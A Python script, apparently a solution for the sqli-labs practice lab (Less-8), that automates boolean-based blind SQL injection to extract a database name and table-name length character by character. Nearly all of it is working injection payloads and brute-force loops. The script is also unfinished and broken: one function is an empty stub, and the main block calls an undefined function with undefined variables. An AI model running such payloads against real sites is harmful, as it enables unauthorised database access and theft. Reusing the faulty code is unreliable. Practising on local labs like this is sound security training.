import requests
from lxml import etree

def GetDBNameLen(main_url):
    # 数据库名长度
    print("正在尝试获取数据库名长度...")
    print("*")
    url = main_url+"?id=1' and if(length(database())={},1,0) --+"  
    for i in range(50):
        test_url = url.format(i)   # 当前测试的url
        req = requests.get(test_url)
        # 提取出成功登录的标志信息:You are in...........
        tag = etree.HTML(req.text).xpath("/html/body/div/font/font/text()")[0]
        if(tag == 'You are in...........'):
            return i

def GetDBName(main_url,len):
    # 数据库名
    print("正在尝试获取数据库名...")
    db_name = ""
    url = main_url+"?id=1' and if(ascii(substr(database(),{},1)) = {},1,0) --+"
    for i in range(len+1): # 试数据库名的第i个字符
        for j in range(48,122):
            test_url = url.format(i,j)
            req = requests.get(test_url)
            tag = etree.HTML(req.text).xpath("/html/body/div/font/font/text()")[0]
            if(tag == 'You are in...........'):
                print("*第%d个字母是"%i+chr(j))
                db_name += chr(j)     # 将测试成功的字符添加到字符串变量
    return db_name

def GetTableNameLen(main_url,DBName):
    # 数据表名称长度
    print("正在尝试获取数据表名称长度...")
    print("*")
    url = main_url+"?id=1' and if((select length(table_name) from information_schema.tables where table_schema='{}' limit 0,1)={},1,0) --+"
    for i in range(50):
        test_url = url.format(DBName,i)
        req = requests.get(test_url)
        tag = etree.HTML(req.text).xpath("/html/body/div/font/font/text()")[0]
        if(tag == 'You are in...........'):
            return i

def GetTableName(main_url,DBName,TableNameLen):
    pass



if __name__ == '__main__':
    main_url = "http://localhost/sqli-labs/Less-8/" # 注入的地址

    db_name_len = GetDBNameLen(main_url)
    print("数据库名长度为"+str(db_name_len)+"\n")

    db_name = GetDBName(main_url,db_name_len)
    print("数据库名为"+db_name+"\n")

    table_name_len = GetTableNameLen(main_url,db_name)
    print("表名称长度为"+ str(table_name_len)+"\n")

    clu_name = GetCluName(db_name, table_name, clu_name_len)
    print(db_name+"数据库的"+table_name+"数据表的第一个字段为"+clu_name+"\n")

